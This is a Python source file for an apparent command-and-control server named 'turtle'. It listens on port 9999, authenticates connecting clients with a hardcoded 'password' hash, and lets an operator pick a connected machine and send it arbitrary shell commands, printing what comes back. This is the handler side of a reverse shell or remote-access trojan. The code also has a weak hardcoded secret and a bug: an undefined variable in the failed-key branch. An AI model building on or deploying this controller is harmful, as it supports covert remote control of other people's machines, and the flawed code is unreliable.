import commands_handler
import socket
import sys
import threading
import time
import hashlib

# =======
#defining messaging protocol constants:
CHECK_SERVER_MSG = b'CHECK_SERVER_MSG'
SERVER_IS_UP_MSG = b'SERVER_IS_UP_MSG'
SERVER_IS_DOWN_MSG = b'SERVER_IS_DOWN_MSG'
CLIENT_INIT_CONN_KEY_MSG = b'CLIENT_INIT_CONN_KEY_MSG'
KEY_EXCHANGE_SUCCEEDED_MSG = b'KEY_EXCHANGE_SUCCEEDED_MSG'
KEY_EXCHANGE_FAILED_MSG = b'KEY_EXCHANGE_FAILED_MSG'

client_states = {}  # Dictionary to track handshake progress per client


#global variables
connections = []
addresses = []
Shutdown_Flag = threading.Event()
listen_event = threading.Event()
global current_client
current_client = None
conn_lock = threading.Lock()
key = "password"
server_key_hash = hashlib.sha256(key.encode()).digest()  



def sock():
    try:
        global s
        print(commands_handler.execution_args_help_message())
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", 9999))
        return s

    except KeyboardInterrupt:
        print("Server shutting down!\n")
        s.close()
        sys.exit(1)


### Handles the handshake and communication for a single client connection:
def handle_client(conn ,addr):
    # a message list for each client to keep track of multiple clients.
    client_states[conn] = []
    try:
        while not Shutdown_Flag.is_set():
            data = conn.recv(1024)
            if not data:
                break

            current_step = client_states[conn][-1] if client_states[conn] else None

            ###implementing messaging dynamic:
            if data == CHECK_SERVER_MSG:
                client_states[conn].append(CHECK_SERVER_MSG)
                conn.send(SERVER_IS_UP_MSG)
                client_states[conn].append(SERVER_IS_UP_MSG)
                print(f"[+] {addr} checked server status")

            #here we assume that client is sending the key with the "init_key" message:
            elif data.startswith(CLIENT_INIT_CONN_KEY_MSG) and current_step == SERVER_IS_UP_MSG:
                #Extracting client key hash from message and comparing to server`s hash: 
                client_key_hash = data[len(CLIENT_INIT_CONN_KEY_MSG):]
                if client_key_hash == server_key_hash:
                    conn.send(KEY_EXCHANGE_SUCCEEDED_MSG)
                    client_states[conn].append(KEY_EXCHANGE_SUCCEEDED_MSG)
                    with conn_lock:
                        connections.append(conn)
                        addresses.append(addr)
                    print(f"[+] {addr} connected successfully!")
                else:
                    conn.send(KEY_EXCHANGE_FAILED_MSG)
                    print(f"[-] {addr} invalid key: {client_key}")
                    conn.close()
                    break

            else:
                conn.send(KEY_EXCHANGE_FAILED_MSG)
                conn.close()
                break

    except Exception as e:
        print(f"[-] Error: {e}")
        conn.close()


### Accepts and manages incoming connections only after the 'listen' command is issued:
def Connection_Handling(s):
    listen_event.wait()
    s.listen(5)
    print("Listening on port: 9999")
    while not Shutdown_Flag.is_set():
        try:
            conn, addr = s.accept()
            print(f"[+] New connection from {addr}")
            # creating a thread for each client: 
            threading.Thread(target=handle_client, args=(conn, addr),daemon=True).start()
        except Exception as e:
            print(f"[-] Connection error: {e}")



### the CMD:
def turtle():
    global current_client
    while not Shutdown_Flag.is_set():
        try:
            prompt = f"{current_client} > " if current_client else "turtle > "
            cmd = input(prompt)

            if not cmd:
                continue
            elif cmd == "list":
                list_connections()

            elif cmd=="logo":
                commands_handler.print_logo()

            elif cmd=="listen":
                if not listen_event.is_set():
                    listen_event.set()

            elif cmd == "help":
                print(commands_handler.execution_args_help_message())
                
            elif cmd == "exit":
                Shutdown_Flag.set()

            elif "select" in cmd:
                try:
                    target = int(cmd.replace("select ", ""))
                    conn = connections[target]
                    current_client = addresses[target]
                except:
                    print("Invalid Client Index\n")
            elif current_client:
                with conn_lock:
                    i = addresses.index(current_client)
                    conn = connections[i]
                    send_commands(conn, cmd)
            else:
                print("Client not found!\n")
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down command interface...")
            Shutdown_Flag.set()
            break


def list_connections():
    print("--- ACTIVE CLIENTS ---")
    for i, addr in enumerate(addresses):
        print(f"{i}     {addr[0]}    {addr[1]}")



def send_commands(conn, cmd):
    try:
        conn.send(cmd.encode())
        client_response = conn.recv(50000).decode()
        print(client_response, end='')
    except (ConnectionResetError, BrokenPipeError):
        print("Client disconnected!")
        with conn_lock:
            if conn in connections:
                index = connections.index(conn)
                global current_client
                if current_client == addresses[index]:
                    current_client = None
                del connections[index]
                del addresses[index]
    except KeyboardInterrupt:
        raise


### Cleans up all active client connections and closes the server socket:
def cleanup(sock):
    with conn_lock:
        for conn in connections:
            conn.close()
    sock.close()

def main():
    s = sock()
    conn_thread = threading.Thread(target=Connection_Handling, args=(s,))
    conn_thread.start()
    try:
        turtle()
    finally:
        Shutdown_Flag.set()
        cleanup(s)

main()



